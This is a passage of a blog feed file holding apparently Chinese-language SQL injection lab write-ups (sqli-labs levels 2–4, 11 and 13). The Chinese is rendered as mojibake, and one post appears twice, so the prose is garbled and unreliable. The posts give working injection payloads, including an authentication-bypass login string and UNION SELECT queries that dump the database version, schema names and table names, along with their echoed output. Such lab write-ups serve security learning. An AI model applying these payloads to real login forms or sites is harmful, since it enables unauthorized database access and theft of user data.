WHERE id=('1)') LIMIT 0,1;</p><p>åœ¨æˆ‘ç‰©ç†ç¯å¢ƒ mysql 8.0 æ—¶æŠ¥é”™çš„ï¼Œç„¶è€Œï¼Œåœ¨ less 2 å¤„çš„ç¯å¢ƒï¼ˆmysql5.3ï¼‰ç¡®å®å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ã€‚ä¸åŒç‰ˆæœ¬å¯¹ () çš„å¤„ç†ä¸å°½ç›¸åŒå‘€ã€‚</p><p>å—¯ï¼Œæƒ³å¿…å¤§ç¥ä»¬ä¹Ÿæ˜¯çŸ¥é“è¿™ä¸ªï¼Œæ‰€ä»¥æ‰ä¸ä¼šç”¨å³æ‹¬å·ä»€ä¹ˆçš„æ£€æµ‹æ³¨å…¥ç‚¹å§ã€‚</p><p>åœ¨è¿™é‡Œæ¢è®¨è¿™ä¸ªï¼Œä¸»è¦æ˜¯æƒ³è§£å†³ä¸€ä¸‹ä»å…¥é—¨å­¦ä¹ ä»¥æ¥çš„ä¸€ä¸ªç–‘é—®ï¼šä¸ºä»€ä¹ˆä½¿ç”¨å•å¼•å·æ¢æµ‹æ³¨å…¥ç‚¹çš„ç–‘é—®ã€‚ï¼ˆä¸çŸ¥é“è§£å†³æ²¡æœ‰ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œç›®å‰æ˜¯è§£å†³äº†ã€‚ï¼‰</p><p>å›æ˜¾ï¼šYou have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear '' LIMIT 0,1' at line 1</p><p>å¯ä»¥çœ‹å‡ºæŠ¥é”™ï¼š' LIMIT 0,1ï¼Œç¬¬ä¸€ä¸ªå•å¼•å·æ˜¾ç„¶æ˜¯æˆ‘ä»¬è¾“å…¥çš„é‚£ä¸ªã€‚</p><p>ç”±æ­¤å¯ä»¥çŒœæµ‹ sql æŸ¥è¯¢è¯­å¥ä¸æ˜¯ id ='1' çš„å½¢å¼ï¼Œå› ä¸ºæ ¹æ® less1æˆ‘ä»¬çŸ¥é“å¦‚æœæ˜¯ id = '1'ï¼Œå³ï¼šä¸€èˆ¬è®¤ä¸ºçš„å­—ç¬¦å‹æ³¨å…¥ï¼ŒæŠ¥é”™åº”è¯¥æ˜¯ï¼š'1''LIMIT 0,1ï¼Œå³ï¼šmysql ä¼šæŠŠå‰é¢çš„ '1'ä¹ŸæŠ¥å‡ºæ¥ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å•å¼•å·å’Œå®ƒä¸€èµ·å½±å“äº†å®ƒã€‚</p><p>ä½†æ˜¯å®é™… sql è¯­å¥å› è¯¥æ˜¯ä»€ä¹ˆæ ·å­çš„å‘¢ï¼Ÿ</p><p>æ ¹æ®æˆ‘ç›®å‰çš„çŸ¥è¯†ï¼Œæˆ‘æœ‰ä»¥ä¸‹ä¸¤ç§çŒœæµ‹ï¼š</p><p>select * from tbl_name where id = 1</p><p>select * from tbl_name where id = ("1")</p><p>å› ä¸ºï¼š</p><p>select * from tbl_name where id = ('1')</p><p>select * from tbl_name where id = (1)</p><p>å¦‚æœåŠ äº†å•å¼•å·ï¼Œè¿™ä¸¤ç§æŠ¥é”™ä¸€å®šä¸æ˜¯å®ƒï¼ŒæŠ¥é”™ä¸­å¾—æœ‰ä¸ªå³æ‹¬å·æ‰è¡Œã€‚</p><p>è¿™é‡Œæˆ‘ä¹Ÿä¸è¡ŒåŒºåˆ†ä»€ä¹ˆæ˜¯å­—ç¬¦æ³¨å…¥ã€ä»€ä¹ˆæ˜¯æ•°å­—æ³¨å…¥ã€‚æ ¹æ®å…·ä½“æƒ…å†µçŒœæµ‹å¼€å‘è€…ç”¨çš„è¯­å¥ï¼Œå¹¶é€ä¸€éªŒè¯ï¼ˆæˆ–è®¸æ ¹æ®ç»éªŒï¼Œä½ çŸ¥é“å“ªç§æ¯”è¾ƒå¸¸ç”¨ï¼Œå°±å…ˆéªŒè¯é‚£ä¸€ç§ï¼‰ï¼Œç›´åˆ°è¯å®è‡ªå·±çš„çŒœæƒ³ä¸ºå‡†ã€‚</p><p>æˆ–è€…è¯´å¦‚æœå®ƒä¸å½±å“æˆ‘ä»¬åé¢çš„è”åˆæŸ¥è¯¢ï¼Œæˆ‘ä»¬ä¸ç”¨åœ¨ä¹å®ƒæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“è¿™é‡Œ<strong>å­˜åœ¨æ³¨å…¥ç‚¹</strong>ï¼ˆæ³¨ï¼šè¦çŸ¥é“æœ‰æ³¨å…¥ç‚¹ï¼Œåˆ«æµ‹è¯•äº†åŠå¤©ï¼Œéƒ½æ²¡æŠ¥è¿‡é”™ï¼Œä½ å°±å¾€åè¿›è¡Œï¼Œå“ªæ€•æ˜¯ä¸ªå‚»å­å–½...ï¼‰ï¼Œè€Œä¸”ä¸ç”¨åŠ å•å¼•å·é—­åˆå‰é¢çš„å•å¼•å·ï¼ˆå› ä¸ºå‰é¢æ²¡æœ‰å¥‡æ•°ä¸ªå•å¼•å·ï¼‰ï¼Œæ­¤å¤–ï¼Œè¿˜æœ‰where å­å¥åé¢è¿˜æœ‰ä¸ª limit å­å¥ï¼Œæˆ‘ä»¬éœ€è¦æ³¨é‡Šæ‰å®ƒã€‚</p><h1 id="less-3">less 3</h1><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹-1">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>é¦–å…ˆå…ˆç”¨å•å¼•å·ï¼Œæ£€æµ‹æ³¨å…¥ç‚¹ã€‚å›æ˜¾æŠ¥é”™ï¼š'1'') LIMIT 0,1</p><p>çŒœæµ‹ sql æŸ¥è¯¢è¯­å¥ï¼šselect * from tbl_name where id = ('1') LIMIT0,1;</p><p>äºæ˜¯æ„é€ ï¼š?id=1') order by 4--+ è¿›è¡ŒçŒœå­—æ®µæ•°</p><h1 id="less-4">less 4</h1><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹-2">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>é¦–å…ˆå…ˆç”¨å•å¼•å·ï¼Œæ£€æµ‹æ³¨å…¥ç‚¹ã€‚æ²¡æœ‰æŠ¥é”™ã€‚è¿™é‡Œæˆ‘ä»¬è¦å­¦ä¹ ä¸€ä¸ªæ–°çš„æ‰‹æ³•ï¼šä½¿ç”¨åŒå¼•å·åŒ…è£¹:id = "1"</p><p>åŸºäºçŒœæµ‹ï¼Œæˆ‘ä»¬ä½¿ç”¨åŒå¼•å·å†æ£€æµ‹æ³¨å…¥ç‚¹ï¼Œå›æ˜¾æŠ¥é”™ï¼š"1"") LIMIT 0,1</p><p>çŒœæƒ³ sql æŸ¥è¯¢è¯­å¥ï¼šselect * from tbl_name where id = ("1") LIMIT0,1;</p><p>æ„é€ ï¼š?id=1") order by 4 --+ æ­¤å­—æ®µ</p><p>çŸ¥é“å­˜åœ¨æ³¨å…¥ç‚¹åï¼Œä¸‹é¢å°±å¼€å§‹çŒœå­—æ®µï¼Œçˆ†ç‰ˆæœ¬ã€åº“åï¼Œç„¶åçˆ†æ‰€æœ‰çš„åº“ï¼Œç„¶åçˆ†åº“ä¸­çš„è¡¨ï¼Œç„¶åçˆ†è¡¨çš„å­—æ®µåï¼Œç„¶åçˆ†æ•°æ®ã€‚æ“ä½œå°±å’Œless-1 çš„ä¸€æ ·çš„ï¼Œè¿™é‡Œä¸å†ç»†è®²ã€‚</p><h1 id="æ€»ç»“">æ€»ç»“</h1><p>æ£€æµ‹æ³¨å…¥ç‚¹</p><p>å…ˆä½¿ç”¨å•å¼•å·ï¼Œçœ‹æŠ¥é”™ä¸å¦ï¼Œ</p><ul><li>å¦‚æœæŠ¥é”™ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ ¹æ®æŠ¥é”™å›æ˜¾è¯­å¥æ„é€ åç»­</li><li>å¦‚æœä¸æŠ¥é”™ï¼Œæ¢åŒå¼•å·ï¼Œçœ‹æŠ¥é”™ä¸å¦ -å¦‚æœæŠ¥é”™ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ ¹æ®æŠ¥é”™å›æ˜¾è¯­å¥æ„é€ åç»­ - å¦‚æœä¸æŠ¥é”™ï¼Œæ¢') æˆ– '))æˆ– ") æˆ– ")) å°è¯•ã€‚</li></ul><p>è‡³äºä¸ºä»€ä¹ˆæ£€æµ‹è¿™å‡ ä¸ªé—­åˆæ–¹å¼å‘¢ï¼Ÿå› ä¸ºè¿™å‡ ä¸ªå¼€å‘äººå‘˜ç”¨çš„å¤šï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤æœ‰äº›å¥‡è‘©çš„ç¨‹åºå‘˜ï¼Œç”¨åˆ«çš„ï¼Œé‚£æ ·å¦‚æœä¼šæŠ¥é”™çš„è¯ï¼Œæ ¹æ®æŠ¥é”™æç¤ºä¹Ÿå¯ä»¥çŒœæµ‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹æ£€æµ‹æ³¨å…¥ç‚¹çš„å°æƒ³æ³•</title>
      <link href="/blog/2019/07/29/websec/sql_injection/view_of_the_injection_point/"/>
      <url>/blog/2019/07/29/websec/sql_injection/view_of_the_injection_point/</url>
      
        <content type="html"><![CDATA[<h1 id="less-2">less 2</h1><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>é¦–å…ˆï¼Œå…ˆç”¨å•å¼•å·ï¼Œæ£€æµ‹æ³¨å…¥ç‚¹ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬åœ¨ id=1åé¢åŠ ä¸œè¥¿çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯ä¸ºäº†åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦ä¼šæ··æ·†æ•°æ®ä¸ä»£ç ï¼Œå°†æˆ‘ä»¬è¾“å…¥çš„<strong>åœ¨æŸç§æƒ…å†µä¸‹</strong>æœ¬å¯ä»¥ä½œä¸ºä»£ç æ‰§è¡Œçš„ç¬¦å·æ€ä¹ˆå¤„ç†ï¼Ÿ</p><p>å½“ç„¶å¤„ç†æ–¹å¼ä¸å¤–ä¹ä¸¤ç§</p><ol type="1"><li>é€šè¿‡è½¬ä¹‰ã€æ£€æµ‹å…³é”®å­—ç­‰æ‰‹æ®µå°†ä»£ç è½¬æ¢ä¸ºæ— å®³çš„æ•°æ®</li><li>å¤„ç†ä¸å½“ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†å¯ä»¥è¢«å½“åšä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬ sqlæ³¨å…¥ä¾¿æ˜¯æºè‡ªäºæ­¤ã€‚</li></ol><p>ä¸ºä»€ä¹ˆå¾ˆå¤šäººéƒ½è¯´å…ˆç”¨å•å¼•å·åˆ¤æ–­æ³¨å…¥ç‚¹å‘¢ï¼Œæˆ‘è®¤ä¸ºæ˜¯å› ä¸º id=1 ã€id= '1'ã€id=('1')çš„å¼€å‘è¯­å¥ç”¨çš„æ¯”è¾ƒå¤šï¼Œé€šè¿‡å•å¼•å·ä»¥åŠæŠ¥é”™å¯ä»¥æ˜ç¡®åœ°åŒºåˆ†å®ƒä»¬ã€‚</p><p>æ¯”å¦‚ä¸‰ç§æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; LIMIT 0,1</span><br><span class="line">&#x27;1&#x27;&#x27; LIMIT 0,1</span><br><span class="line">&#x27;1&#x27;&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨å·¦æ‹¬å·å‘¢ï¼Ÿid=('1)')</p><p>id=1 ã€id= '1' ã€id=('1') åˆ†åˆ«æŠ¥é”™ï¼š) LIMIT 0,1ã€'1)' LIMIT0,1ã€Unknown column 'id' in 'where clause'.</p><p>è¿™æ ·ä¹Ÿæ¯”è¾ƒå®¹æ˜“åŒºåˆ†, ä½†æ˜¯ï¼Œï¼ˆåœ¨ less 3ä¸­ä½¿ç”¨æœ‰å¼•å·ç«Ÿç„¶æ­£å¸¸è¿”å›ï¼Œæˆ‘è¦åäº†..ï¼‰ç»è¿‡ä¸€é˜µæŠ˜è…¾ï¼Œæˆ‘å‘ç°è¿™æ ·ä¸€æ¡è¯­å¥ï¼šSELECT * FROM users WHERE id=('1)') LIMIT 0,1;</p><p>åœ¨æˆ‘ç‰©ç†ç¯å¢ƒ mysql 8.0 æ—¶æŠ¥é”™çš„ï¼Œç„¶è€Œï¼Œåœ¨ less 2 å¤„çš„ç¯å¢ƒï¼ˆmysql5.3ï¼‰ç¡®å®å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ã€‚ä¸åŒç‰ˆæœ¬å¯¹ () çš„å¤„ç†ä¸å°½ç›¸åŒå‘€ã€‚</p><p>å—¯ï¼Œæƒ³å¿…å¤§ç¥ä»¬ä¹Ÿæ˜¯çŸ¥é“è¿™ä¸ªï¼Œæ‰€ä»¥æ‰ä¸ä¼šç”¨å³æ‹¬å·ä»€ä¹ˆçš„æ£€æµ‹æ³¨å…¥ç‚¹å§ã€‚</p><p>åœ¨è¿™é‡Œæ¢è®¨è¿™ä¸ªï¼Œä¸»è¦æ˜¯æƒ³è§£å†³ä¸€ä¸‹ä»å…¥é—¨å­¦ä¹ ä»¥æ¥çš„ä¸€ä¸ªç–‘é—®ï¼šä¸ºä»€ä¹ˆä½¿ç”¨å•å¼•å·æ¢æµ‹æ³¨å…¥ç‚¹çš„ç–‘é—®ã€‚ï¼ˆä¸çŸ¥é“è§£å†³æ²¡æœ‰ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œç›®å‰æ˜¯è§£å†³äº†ã€‚ï¼‰</p><p>å›æ˜¾ï¼šYou have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear '' LIMIT 0,1' at line 1</p><p>å¯ä»¥çœ‹å‡ºæŠ¥é”™ï¼š' LIMIT 0,1ï¼Œç¬¬ä¸€ä¸ªå•å¼•å·æ˜¾ç„¶æ˜¯æˆ‘ä»¬è¾“å…¥çš„é‚£ä¸ªã€‚</p><p>ç”±æ­¤å¯ä»¥çŒœæµ‹ sql æŸ¥è¯¢è¯­å¥ä¸æ˜¯ id ='1' çš„å½¢å¼ï¼Œå› ä¸ºæ ¹æ® less1æˆ‘ä»¬çŸ¥é“å¦‚æœæ˜¯ id = '1'ï¼Œå³ï¼šä¸€èˆ¬è®¤ä¸ºçš„å­—ç¬¦å‹æ³¨å…¥ï¼ŒæŠ¥é”™åº”è¯¥æ˜¯ï¼š'1''LIMIT 0,1ï¼Œå³ï¼šmysql ä¼šæŠŠå‰é¢çš„ '1'ä¹ŸæŠ¥å‡ºæ¥ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å•å¼•å·å’Œå®ƒä¸€èµ·å½±å“äº†å®ƒã€‚</p><p>ä½†æ˜¯å®é™… sql è¯­å¥å› è¯¥æ˜¯ä»€ä¹ˆæ ·å­çš„å‘¢ï¼Ÿ</p><p>æ ¹æ®æˆ‘ç›®å‰çš„çŸ¥è¯†ï¼Œæˆ‘æœ‰ä»¥ä¸‹ä¸¤ç§çŒœæµ‹ï¼š</p><p>select * from tbl_name where id = 1</p><p>select * from tbl_name where id = ("1")</p><p>å› ä¸ºï¼š</p><p>select * from tbl_name where id = ('1')</p><p>select * from tbl_name where id = (1)</p><p>å¦‚æœåŠ äº†å•å¼•å·ï¼Œè¿™ä¸¤ç§æŠ¥é”™ä¸€å®šä¸æ˜¯å®ƒï¼ŒæŠ¥é”™ä¸­å¾—æœ‰ä¸ªå³æ‹¬å·æ‰è¡Œã€‚</p><p>è¿™é‡Œæˆ‘ä¹Ÿä¸è¡ŒåŒºåˆ†ä»€ä¹ˆæ˜¯å­—ç¬¦æ³¨å…¥ã€ä»€ä¹ˆæ˜¯æ•°å­—æ³¨å…¥ã€‚æ ¹æ®å…·ä½“æƒ…å†µçŒœæµ‹å¼€å‘è€…ç”¨çš„è¯­å¥ï¼Œå¹¶é€ä¸€éªŒè¯ï¼ˆæˆ–è®¸æ ¹æ®ç»éªŒï¼Œä½ çŸ¥é“å“ªç§æ¯”è¾ƒå¸¸ç”¨ï¼Œå°±å…ˆéªŒè¯é‚£ä¸€ç§ï¼‰ï¼Œç›´åˆ°è¯å®è‡ªå·±çš„çŒœæƒ³ä¸ºå‡†ã€‚</p><p>æˆ–è€…è¯´å¦‚æœå®ƒä¸å½±å“æˆ‘ä»¬åé¢çš„è”åˆæŸ¥è¯¢ï¼Œæˆ‘ä»¬ä¸ç”¨åœ¨ä¹å®ƒæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“è¿™é‡Œ<strong>å­˜åœ¨æ³¨å…¥ç‚¹</strong>ï¼ˆæ³¨ï¼šè¦çŸ¥é“æœ‰æ³¨å…¥ç‚¹ï¼Œåˆ«æµ‹è¯•äº†åŠå¤©ï¼Œéƒ½æ²¡æŠ¥è¿‡é”™ï¼Œä½ å°±å¾€åè¿›è¡Œï¼Œå“ªæ€•æ˜¯ä¸ªå‚»å­å–½...ï¼‰ï¼Œè€Œä¸”ä¸ç”¨åŠ å•å¼•å·é—­åˆå‰é¢çš„å•å¼•å·ï¼ˆå› ä¸ºå‰é¢æ²¡æœ‰å¥‡æ•°ä¸ªå•å¼•å·ï¼‰ï¼Œæ­¤å¤–ï¼Œè¿˜æœ‰where å­å¥åé¢è¿˜æœ‰ä¸ª limit å­å¥ï¼Œæˆ‘ä»¬éœ€è¦æ³¨é‡Šæ‰å®ƒã€‚</p><h1 id="less-3">less 3</h1><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹-1">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>é¦–å…ˆå…ˆç”¨å•å¼•å·ï¼Œæ£€æµ‹æ³¨å…¥ç‚¹ã€‚å›æ˜¾æŠ¥é”™ï¼š'1'') LIMIT 0,1</p><p>çŒœæµ‹ sql æŸ¥è¯¢è¯­å¥ï¼šselect * from tbl_name where id = ('1') LIMIT0,1;</p><p>äºæ˜¯æ„é€ ï¼š?id=1') order by 4--+ è¿›è¡ŒçŒœå­—æ®µæ•°</p><h1 id="less-4">less 4</h1><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹-2">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>é¦–å…ˆå…ˆç”¨å•å¼•å·ï¼Œæ£€æµ‹æ³¨å…¥ç‚¹ã€‚æ²¡æœ‰æŠ¥é”™ã€‚è¿™é‡Œæˆ‘ä»¬è¦å­¦ä¹ ä¸€ä¸ªæ–°çš„æ‰‹æ³•ï¼šä½¿ç”¨åŒå¼•å·åŒ…è£¹:id = "1"</p><p>åŸºäºçŒœæµ‹ï¼Œæˆ‘ä»¬ä½¿ç”¨åŒå¼•å·å†æ£€æµ‹æ³¨å…¥ç‚¹ï¼Œå›æ˜¾æŠ¥é”™ï¼š"1"") LIMIT 0,1</p><p>çŒœæƒ³ sql æŸ¥è¯¢è¯­å¥ï¼šselect * from tbl_name where id = ("1") LIMIT0,1;</p><p>æ„é€ ï¼š?id=1") order by 4 --+ æ­¤å­—æ®µ</p><p>çŸ¥é“å­˜åœ¨æ³¨å…¥ç‚¹åï¼Œä¸‹é¢å°±å¼€å§‹çŒœå­—æ®µï¼Œçˆ†ç‰ˆæœ¬ã€åº“åï¼Œç„¶åçˆ†æ‰€æœ‰çš„åº“ï¼Œç„¶åçˆ†åº“ä¸­çš„è¡¨ï¼Œç„¶åçˆ†è¡¨çš„å­—æ®µåï¼Œç„¶åçˆ†æ•°æ®ã€‚æ“ä½œå°±å’Œless-1 çš„ä¸€æ ·çš„ï¼Œè¿™é‡Œä¸å†ç»†è®²ã€‚</p><h1 id="æ€»ç»“">æ€»ç»“</h1><p>æ£€æµ‹æ³¨å…¥ç‚¹</p><p>å…ˆä½¿ç”¨å•å¼•å·ï¼Œçœ‹æŠ¥é”™ä¸å¦ï¼Œ</p><ul><li>å¦‚æœæŠ¥é”™ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ ¹æ®æŠ¥é”™å›æ˜¾è¯­å¥æ„é€ åç»­</li><li>å¦‚æœä¸æŠ¥é”™ï¼Œæ¢åŒå¼•å·ï¼Œçœ‹æŠ¥é”™ä¸å¦ -å¦‚æœæŠ¥é”™ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ ¹æ®æŠ¥é”™å›æ˜¾è¯­å¥æ„é€ åç»­ - å¦‚æœä¸æŠ¥é”™ï¼Œæ¢') æˆ– '))æˆ– ") æˆ– ")) å°è¯•ã€‚</li></ul><p>è‡³äºä¸ºä»€ä¹ˆæ£€æµ‹è¿™å‡ ä¸ªé—­åˆæ–¹å¼å‘¢ï¼Ÿå› ä¸ºè¿™å‡ ä¸ªå¼€å‘äººå‘˜ç”¨çš„å¤šï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤æœ‰äº›å¥‡è‘©çš„ç¨‹åºå‘˜ï¼Œç”¨åˆ«çš„ï¼Œé‚£æ ·å¦‚æœä¼šæŠ¥é”™çš„è¯ï¼Œæ ¹æ®æŠ¥é”™æç¤ºä¹Ÿå¯ä»¥çŒœæµ‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>post æ³¨å…¥</title>
      <link href="/blog/2019/07/28/websec/sql_injection/post_injection/"/>
      <url>/blog/2019/07/28/websec/sql_injection/post_injection/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹">ç®€ä»‹</h1><p>é¦–å…ˆ,äº†è§£ get ä¸ post æ–¹æ³•.</p><p><ahref="https://mp.weixin.qq.com/s?__biz=MzI3NzIzMzg3Mw==&amp;mid=100000054&amp;idx=1&amp;sn=71f6c214f3833d9ca20b9f7dcd9d33e4#rd">99%çš„äººéƒ½ç†è§£é”™äº†HTTP ä¸­ GET ä¸ POST çš„åŒºåˆ«</a></p><p><ahref="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp">HTTPæ–¹æ³•ï¼šGET å¯¹æ¯” POST</a></p><p>å—¯ï¼Œå‚å¤§è…¿çš„æ„Ÿè§‰çœŸå¥½ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬è¿›å…¥ post æ³¨å…¥ã€‚</p><p>æ‰€è°“ postå°±æ˜¯æ•°æ®ä»å®¢æˆ·ç«¯æäº¤åˆ°æœåŠ¡å™¨ç«¯ï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨ç™»å½•è¿‡ç¨‹ä¸­ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨æˆ·åå’Œå¯†ç ä»¥è¡¨å•çš„å½¢å¼æäº¤ï¼Œæäº¤åˆ°æœåŠ¡å™¨åæœåŠ¡å™¨å†è¿›è¡ŒéªŒè¯ã€‚è¿™å°±æ˜¯ä¸€æ¬¡post çš„è¿‡ç¨‹çš„ã€‚ï¼ˆå½“ç„¶ï¼Œæ²¡æœ‰ä¸Šé¢é“¾æ¥è®²å¾—å¥½ï¼‰ã€‚</p><p>æ³¨æ„ï¼š</p><ol type="1"><li>post å’Œ get çš„æ ¼å¼ï¼šå‰è€…ï¼šåœ¨ hackbar çš„ post æ•°æ®æ¡†ä¸­å†™ å‚æ•°1=å€¼&amp;å‚æ•° 2=å€¼ï¼Œåè€…åœ¨ url å°¾éƒ¨ phpï¼Ÿå‚æ•° 1=å€¼&amp;å‚æ•° 2=å€¼ã€‚</li><li>æ¯ä¸ª postæäº¤æ•°æ®çš„åœ°æ–¹éƒ½å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œç™»å½•æ¡†ä¸è¦åªå…³æ³¨ç”¨æˆ·åï¼Œå½“ç”¨æˆ·åæ¡†ä¸è¡Œä¹‹åï¼Œå†å»çœ‹çœ‹å¯†ç æ¡†ã€‚</li><li>postæ³¨å…¥å…¶å®é™¤äº†ä½ç½®å’Œå½¢å¼å˜åŒ–äº†ä¸€ä¸‹ï¼Œå‰é¢å›æ˜¾ï¼ŒæŠ¥é”™ç›²æ³¨ï¼Œæ—¶é—´ç›²æ³¨ï¼Œå¸ƒå°”ç›²æ³¨ç­‰æ–¹æ³•è¿˜éƒ½å¯ä»¥ç”¨ã€‚</li></ol><h1 id="æµç¨‹">æµç¨‹</h1><p>æ­¤æµç¨‹ä¸ºæ³¨å…¥ less 11 çš„æµç¨‹ã€‚</p><h2 id="ç†Ÿæ‚‰é¡µé¢">ç†Ÿæ‚‰é¡µé¢</h2><p>å¤§è‡´æµè§ˆä¸€ä¸‹é¡µé¢ï¼Œç”¨æ­£ç¡®å¯†ç ç™»å½•çœ‹çœ‹ç™»å½•æˆåŠŸä¸ç™»å½•å¤±è´¥çš„æ ·å­ã€‚</p><p>å…ˆç†Ÿæ‚‰ä¸€ä¸‹ï¼Œæœ‰åˆ©äºåé¢æ›´å¥½çš„è¿›è¡Œæ³¨å…¥ã€‚</p><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>å…ˆæµ‹è¯•ç”¨æˆ·åç™»å½•æ æœ‰æ—  post æ³¨å…¥ï¼š ä¸‡èƒ½å¯†ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27; #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆåŠŸ</p><h2 id="çŒœå­—æ®µæ•°">çŒœå­—æ®µæ•°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27; order by 2 #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>2 ä¸ªå­—æ®µ</p><h2 id="æŸ¥æ˜¾ç¤ºä½">æŸ¥æ˜¾ç¤ºä½</h2><p>æ³¨æ„æŸ¥æ˜¾ç¤ºä½çš„æ—¶å€™ï¼Œé€šè¿‡åŠ ç¬¦å·ç­‰ï¼Œä½¿å¾—å‰é¢çš„æŸ¥è¯¢æ— æœã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin<span class="string">&#x27; union select 1,2 #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><blockquote><p>Your Login name:1 Your Password:2</p></blockquote><p>ä¸¤ä¸ªæ˜¾ç¤ºä½éƒ½æœ‰</p><h2 id="æ•°æ®åº“ç‰ˆæœ¬æ•°æ®åº“å">æ•°æ®åº“ç‰ˆæœ¬,æ•°æ®åº“å</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin<span class="string">&#x27; union select database(),version() #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><blockquote><p>Your Login name:security Your Password:5.5.53</p></blockquote><h2 id="æ‰€æœ‰æ•°æ®åº“">æ‰€æœ‰æ•°æ®åº“</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin<span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemata #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><blockquote><p>YourPassword:information_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte</p></blockquote><h2 id="å½“å‰æ•°æ®åº“ä¸‹çš„è¡¨">å½“å‰æ•°æ®åº“ä¸‹çš„è¡¨</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-admin<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; #&amp;passwd=125</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><blockquote><p>Your Password:emails,referers,uagents,users</p></blockquote><p>less 11 åˆ°æ­¤ä¸ºæ­¢ã€‚</p><h1 id="less-13">less 13</h1><p>ä¸ºä»€ä¹ˆè¿˜æœ‰è®²ä¸€ä¸‹ less 13 å‘¢ï¼Ÿæ„Ÿè§‰è‡ªå·±ä» less 13é‡Œé¢å­¦åˆ°ä¸€ç‚¹ä¸çŸ¥é“çš„ä¸œè¥¿ï¼Œæ‰€ä»¥è¦æä¸€ä¸‹ã€‚less 13 ä¹Ÿæ˜¯ postæ³¨å…¥ï¼Œæµç¨‹ä¸ä¸Šé¢å¤§è‡´ç›¸åŒï¼Œä¸å†èµ˜è¿°ï¼Œåªè®²å‡ ä¸ªå…³é”®çš„æ­¥éª¤ã€‚</p><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹-1">æ£€æµ‹æ³¨å…¥ç‚¹</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;&amp;passwd=admin</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><blockquote><p>You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear 'admin') LIMIT 0,1' at line 